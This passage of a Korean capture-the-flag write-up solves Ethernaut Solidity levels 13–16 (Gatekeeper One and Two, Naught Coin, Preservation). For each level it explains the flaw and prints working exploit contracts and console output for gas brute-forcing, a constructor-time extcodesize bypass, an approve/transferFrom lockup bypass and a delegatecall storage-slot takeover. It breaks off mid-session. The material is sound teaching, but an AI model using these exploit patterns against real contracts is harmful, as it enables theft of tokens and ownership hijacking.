+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
+    require(msg.sender <span style="color:#f92672">!=</span> tx.origin);     <span style="color:#75715e">// using contracts
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">_</span>;
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
+    require(gasleft().mod(<span style="color:#ae81ff">8191</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">_</span>;
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) {
+      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">==</span> <span style="color:#66d9ef">uint16</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part one&#34;</span>);
+      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">uint64</span>(_gateKey), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part two&#34;</span>);
+      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">==</span> <span style="color:#66d9ef">uint16</span>(tx.origin), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part three&#34;</span>);
+    <span style="color:#66d9ef">_</span>;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) <span style="color:#66d9ef">public</span> gateOne gateTwo gateThree(_gateKey) <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+    entrant <span style="color:#f92672">=</span> tx.origin;
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+  }
+}
+</code></pre></div><p>GateKeeperOne 컨트랙트의 <code>enter()</code> 함수를 호출하여 <code>address entrant</code>에 <code>tx.origin</code> 값을 저장하면 통과할 수 있다.</p>
+<p><code>enter()</code> 함수에는 <code>gateOne</code> / <code>gateTwo</code> / <code>gateThree</code> 와 같이 3개의 modifier(함수 제어자)가 적용되어 있으며, 해당 함수 제어자들의 조건을 만족시켜야 함수 내부의 코드가 실행된다.</p>
+<p><strong>gateOne()</strong></p>
+<ul>
+<li><code>msg.sender</code>와 <code>tx.origin</code>이 다른 주소여야 하므로, 컨트랙트를 통해 <code>enter()</code>를 호출하면 조건을 만족할 수 있다.</li>
+</ul>
+<p><strong>gateTwo()</strong></p>
+<ul>
+<li>
+<p><code>gateTwo()</code> 호출 시점에 남아있는 잔여 가스인 <code>gasleft()</code> 에 modular 8191 연산의 결과가 0이어야 한다.</p>
+</li>
+<li>
+<p>Brute-Force를 통해 해결했다.</p>
+</li>
+</ul>
+<p><strong>gateThree()</strong></p>
+<ul>
+<li><code>enter()</code> 함수로 전달된 <code>bytes8 _gateKey</code>의 상위부터 5,6번째 바이트는 00 00 이어야 하고, 7,8번째 바이트는 <code>tx.origin</code>(공격자 EOA) 주소의 하위 2바이트 값과 동일해야 한다.</li>
+</ul>
+<h3 id="exploit-12">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-12">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">GatekeeperOneExploit</span> {
+    <span style="color:#66d9ef">address</span> targetAddr;
+    <span style="color:#66d9ef">uint64</span> <span style="color:#66d9ef">public</span> gatekeyUint <span style="color:#f92672">=</span>  <span style="color:#66d9ef">uint64</span>(<span style="color:#66d9ef">uint256</span>(<span style="color:#66d9ef">uint160</span>(msg.sender)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF0000FFFF</span>);
+    <span style="color:#66d9ef">bytes8</span> <span style="color:#66d9ef">public</span> gatekey <span style="color:#f92672">=</span> <span style="color:#66d9ef">bytes8</span>(gatekeyUint);
+    
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _targetAddr) <span style="color:#66d9ef">public</span> {
+        targetAddr <span style="color:#f92672">=</span> _targetAddr;
+    }
+    
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>){
+        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> payload <span style="color:#f92672">=</span> abi.encodeWithSignature(<span style="color:#e6db74">&#34;enter(bytes8)&#34;</span>, gatekey);
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">uint16</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> ; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">1000</span> ; i<span style="color:#f92672">++</span>){
+            (<span style="color:#66d9ef">bool</span> bSuccess, <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> data) <span style="color:#f92672">=</span> targetAddr.call.gas(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8191</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>)(payload);
+            <span style="color:#66d9ef">if</span>(bSuccess){
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+            }
+        }
+    }
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000&#39;</span>
+
+<span style="color:#75715e">// GatekeeperOneExploit Contract Deploy
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// exploit()
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+<span style="color:#e6db74">&#39;0x--------------AttackerEOA---------------&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-14-gatekeeper-two"># 14. Gatekeeper Two<a hidden class="anchor" aria-hidden="true" href="#-14-gatekeeper-two">#</a></h2>
+<h3 id="summary-13">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-13">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">GatekeeperTwo</span> {
+
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> entrant;
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
+    require(msg.sender <span style="color:#f92672">!=</span> tx.origin);
+    <span style="color:#66d9ef">_</span>;
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
+    <span style="color:#66d9ef">uint</span> x;
+    <span style="color:#66d9ef">assembly</span> { x <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(<span style="color:#a6e22e">caller</span>()) }
+    require(x <span style="color:#960050;background-color:#1e0010">==</span> <span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+    _<span style="color:#960050;background-color:#1e0010">;</span>
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) {
+    require(<span style="color:#66d9ef">uint64</span>(<span style="color:#66d9ef">bytes8</span>(keccak256(abi.encodePacked(msg.sender)))) <span style="color:#f92672">^</span> <span style="color:#66d9ef">uint64</span>(_gateKey) <span style="color:#f92672">==</span> <span style="color:#66d9ef">uint64</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+    <span style="color:#66d9ef">_</span>;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) <span style="color:#66d9ef">public</span> gateOne gateTwo gateThree(_gateKey) <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+    entrant <span style="color:#f92672">=</span> tx.origin;
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+  }
+}
+</code></pre></div><p>이전 문제와 마찬가지로 <code>enter()</code> 함수를 호출하여 <code>address entrant</code>에 <code>tx.origin</code> 값을 저장하면 통과할 수 있으며, 3개의 modifier를 만족시켜야 한다.</p>
+<p><strong>gateOne()</strong></p>
+<ul>
+<li><code>msg.sender</code>와 <code>tx.origin</code>이 다른 주소여야 하므로, 컨트랙트를 통해 <code>enter()</code>를 호출하면 조건을 만족할 수 있다.</li>
+</ul>
+<p><strong>gateTwo()</strong></p>
+<ul>
+<li>
+<p><code>extcodesize()</code>는 인자로 전달된 계정의 코드 사이즈를 반환하는 함수이므로, 호출한 컨트랙트의 코드 사이즈가 0이어야 한다.</p>
+</li>
+<li>
+<p>이더리움 yellow paper에 따르면, constructor() 호출 시점에 코드 사이즈는 0으로 계산된다.</p>
+</li>
+<li>
+<p>공격자 컨트랙트의 constructor()에서 <code>enter()</code>를 호출하면 된다.</p>
+</li>
+</ul>
+<p><strong>gateThree()</strong></p>
+<ul>
+<li><code>msg.sender</code>(공격자 컨트랙트 주소)를 해시한 값의 하위 8바이트 값과  <code>_gateKey</code> XOR 연산의 결과가 2**64-1이 되어야 한다.</li>
+</ul>
+<h3 id="exploit-13">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-13">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">GatekeeperTwoExploit</span> {
+    <span style="color:#66d9ef">bytes8</span> <span style="color:#66d9ef">public</span> gatekey;
+    
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _targetAddr) <span style="color:#66d9ef">public</span> {
+        gatekey <span style="color:#f92672">=</span> <span style="color:#66d9ef">bytes8</span>(<span style="color:#66d9ef">uint64</span>(<span style="color:#66d9ef">bytes8</span>(keccak256(abi.encodePacked(<span style="color:#66d9ef">address</span>(this))))) <span style="color:#f92672">^</span> (<span style="color:#66d9ef">uint64</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+        
+        _targetAddr.call(abi.encodeWithSignature(<span style="color:#e6db74">&#34;enter(bytes8)&#34;</span>, gatekey));
+    }
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000&#39;</span>
+
+<span style="color:#75715e">// GatekeeperTwoExploit Contract Deploy
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">entrant</span>()
+<span style="color:#e6db74">&#39;0x--------------AttackerEOA---------------&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-15-naught-coin"># 15. Naught Coin<a hidden class="anchor" aria-hidden="true" href="#-15-naught-coin">#</a></h2>
+<h3 id="summary-14">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-14">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span>;
+
+ <span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">NaughtCoin</span> <span style="color:#66d9ef">is</span> ERC20 {
+
+  <span style="color:#75715e">// string public constant name = &#39;NaughtCoin&#39;;
+</span><span style="color:#75715e"></span>  <span style="color:#75715e">// string public constant symbol = &#39;0x0&#39;;
+</span><span style="color:#75715e"></span>  <span style="color:#75715e">// uint public constant decimals = 18;
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> timeLock <span style="color:#f92672">=</span> now <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">365</span> <span style="color:#66d9ef">days</span>;
+  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> INITIAL_SUPPLY;
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> player;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _player) 
+  ERC20(<span style="color:#e6db74">&#39;NaughtCoin&#39;</span>, <span style="color:#e6db74">&#39;0x0&#39;</span>)
+  <span style="color:#66d9ef">public</span> {
+    player <span style="color:#f92672">=</span> _player;
+    INITIAL_SUPPLY <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#66d9ef">uint256</span>(decimals()));
+    <span style="color:#75715e">// _totalSupply = INITIAL_SUPPLY;
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// _balances[player] = INITIAL_SUPPLY;
+</span><span style="color:#75715e"></span>    _mint(player, INITIAL_SUPPLY);
+    emit Transfer(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>), player, INITIAL_SUPPLY);
+  }
+  
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint256</span> _value) <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">public</span> lockTokens <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">bool</span>) {
+    super.transfer(_to, _value);
+  }
+
+  <span style="color:#75715e">// Prevent the initial owner from transferring tokens until the timelock has passed
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">lockTokens</span>() {
+    <span style="color:#66d9ef">if</span> (msg.sender <span style="color:#f92672">==</span> player) {
+      require(now <span style="color:#f92672">&gt;</span> timeLock);
+      <span style="color:#66d9ef">_</span>;
+    } <span style="color:#66d9ef">else</span> {
+     <span style="color:#66d9ef">_</span>;
+    }
+  } 
+}
+</code></pre></div><p>player에게 ERC20 기반의 NaughtCoin 토큰 1,000,000개가 지급되었는데, <code>transfer()</code> 함수에 <code>lockTokens()</code> 제어자를 적용하여 10년동안 다른 지갑으로 옮기지 못하도록 설정되어 있다.</p>
+<p><code>transfer()</code> 함수는 <code>super.trasnfer()</code>에 의해 상속받은 ERC20의 <code>transfer()</code> 함수를 호출하게 된다.</p>
+<p>ERC20에서는 토큰을 전송하기 위해 <code>transfer()</code> 이외에 <code>approve()</code> / <code>transferFrom()</code> 함수가 있다.</p>
+<p>해당 기능을 이용해 lockup periods를 우회하여 토큰 전송이 가능하다.</p>
+<h3 id="exploit-14">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-14">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span>;
+
+ <span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">NaughtCoinExploit</span> {
+
+  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> INITIAL_SUPPLY <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">18</span>);
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> player;
+
+  ERC20 <span style="color:#66d9ef">public</span> naughtCoin;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _player, <span style="color:#66d9ef">address</span> _naughtCoinAddress) <span style="color:#66d9ef">public</span> {
+    player <span style="color:#f92672">=</span> _player;
+    naughtCoin <span style="color:#f92672">=</span> ERC20(_naughtCoinAddress);
+  }
+  
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">external</span> {
+      naughtCoin.transferFrom(player, <span style="color:#66d9ef">address</span>(this), INITIAL_SUPPLY);
+  } 
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">initial_supply</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">player</span>);
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">fromWei</span>(<span style="color:#a6e22e">initial_supply</span>);
+<span style="color:#e6db74">&#39;1000000&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">fromWei</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#e6db74">&#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB&#34;</span>));
+<span style="color:#e6db74">&#39;0&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">approve</span>([<span style="color:#a6e22e">ExploitContractAddress</span>], <span style="color:#a6e22e">initial_supply</span>);    
+<span style="color:#75715e">// await contract.approve(&#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB&#34;, initial_supply);
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Exploit Contract Deploy &amp; call exploit()
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">fromWei</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">player</span>));
+<span style="color:#e6db74">&#39;0&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">fromWei</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#e6db74">&#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB&#34;</span>));
+<span style="color:#e6db74">&#39;1000000&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><h2 id="-16-preservation"># 16. Preservation<a hidden class="anchor" aria-hidden="true" href="#-16-preservation">#</a></h2>
+<h3 id="summary-15">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-15">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Preservation</span> {
+
+  <span style="color:#75715e">// public library contracts 
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> timeZone1Library;    <span style="color:#75715e">// slot 0
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> timeZone2Library;    <span style="color:#75715e">// slot 1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;               <span style="color:#75715e">// slot 2
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint</span> storedTime;                    <span style="color:#75715e">// slot 3
+</span><span style="color:#75715e"></span>  <span style="color:#75715e">// Sets the function signature for delegatecall
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bytes4</span> <span style="color:#66d9ef">constant</span> setTimeSignature <span style="color:#f92672">=</span> <span style="color:#66d9ef">bytes4</span>(keccak256(<span style="color:#e6db74">&#34;setTime(uint256)&#34;</span>));
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _timeZone1LibraryAddress, <span style="color:#66d9ef">address</span> _timeZone2LibraryAddress) <span style="color:#66d9ef">public</span> {
+    timeZone1Library <span style="color:#f92672">=</span> _timeZone1LibraryAddress; 
+    timeZone2Library <span style="color:#f92672">=</span> _timeZone2LibraryAddress; 
+    owner <span style="color:#f92672">=</span> msg.sender;
+  }
+ 
+  <span style="color:#75715e">// set the time for timezone 1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setFirstTime</span>(<span style="color:#66d9ef">uint</span> _timeStamp) <span style="color:#66d9ef">public</span> {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  <span style="color:#75715e">// set the time for timezone 2
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setSecondTime</span>(<span style="color:#66d9ef">uint</span> _timeStamp) <span style="color:#66d9ef">public</span> {
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+<span style="color:#75715e">// Simple library contract to set the time
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">LibraryContract</span> {
+
+  <span style="color:#75715e">// stores a timestamp 
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint</span> storedTime;         <span style="color:#75715e">// slot 0
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setTime</span>(<span style="color:#66d9ef">uint</span> _time) <span style="color:#66d9ef">public</span> {
+    storedTime <span style="color:#f92672">=</span> _time;
+  }
+}
+</code></pre></div><p>Preservation 컨트랙트는 <code>constructor()</code> 에서 <code>setTime()</code> 함수를 포함하고 있는 2개의 timeZomeLibrary 컨트랙트 주소를 입력받는다.</p>
+<p><code>setFirstTime()</code> 호출 시, 첫번째 <code>timeZone1Library::setTime()</code>을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정하고, <code>setSecondTime()</code> 호출 시, 두번째 <code>timeZone2Library::setTime()</code>을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정한다.</p>
+<p>위 컨트랙트의 <code>owner</code> 값을 player 주소로 변경해야 한다.</p>
+<h3 id="exploit-15">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-15">#</a></h3>
+<p>delegatecall()로 인해, caller인 <code>Preservation()</code> 컨트랙트의 storage 영역이 변경된다.</p>
+<ul>
+<li>개발자의 의도는 각 함수/인자 전달을 통해 callee인 <code>LibraryContract</code> 컨트랙트의 <code>uint storedTime</code>을 변경하는 것</li>
+</ul>
+<p>(1) [slot 0] <code>address public timeZone1Library</code> 변경</p>
+<ul>
+<li>첫번째 <code>setFirstTime()</code> 호출 시, <code>LibraryContract::storedTime</code>(slot 0)가 아닌 <code>Preservation::timeZone1Library</code>(slot 0)이 변경된다.</li>
+<li>이 때 공격자가 개발한 컨트랙트의 주소를 전달하여, 이후 <code>setFirstTime()</code>을 통해 호출되는 delegatecall()을 공격자의 컨트랙트로 보낼 수 있다.</li>
+</ul>
+<p>(2) [slot 2] <code>address public owner</code> 변경</p>
+<ul>
+<li>두번째 <code>setFirstTime()</code> 호출 시, delegatecall()로 공격자가 개발한 컨트랙트의 <code>setTime()</code>을 호출하게 된다.</li>
+<li>공격자 컨트랙트의 <code>setTime()</code>은 <code>Preservation::owner</code>(slot 2)를 변경하는 코드로 구성하면 된다.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IPreservation</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setFirstTime</span>(<span style="color:#66d9ef">uint</span> _timeStamp) <span style="color:#66d9ef">external</span>;
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">LibraryContractHook</span> {
+    <span style="color:#66d9ef">address</span> slot0;
+    <span style="color:#66d9ef">address</span> slot1;
+    <span style="color:#66d9ef">address</span> slot2_owner; 
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setTime</span>(<span style="color:#66d9ef">uint</span> _time) <span style="color:#66d9ef">public</span> {
+        <span style="color:#75715e">//owner = address(_time);
+</span><span style="color:#75715e"></span>        slot2_owner <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(<span style="color:#66d9ef">uint160</span>(_time));
+    }
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">PreservationExploit</span> {
+    <span style="color:#66d9ef">address</span> target;
+    LibraryContractHook hookLibrary;
+    <span style="color:#66d9ef">address</span> attackerEOA;
+
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _preservation) <span style="color:#66d9ef">public</span> {
+        target <span style="color:#f92672">=</span> _preservation;
+        hookLibrary <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> LibraryContractHook();
+        attackerEOA <span style="color:#f92672">=</span> msg.sender;
+    }
+
+    <span style="color:#75715e">// run twice?
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">public</span> {
+        IPreservation(target).setFirstTime(<span style="color:#66d9ef">uint256</span>(<span style="color:#66d9ef">address</span>(hookLibrary)));
+
+        IPreservation(target).setFirstTime(<span style="color:#66d9ef">uint256</span>(attackerEOA));
+    }
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">timeZone1Library</span>();
+<span style="color:#e6db74">&#39;0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">timeZone2Library</span>();
+<span style="color:#e6db74">&#39;0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>();
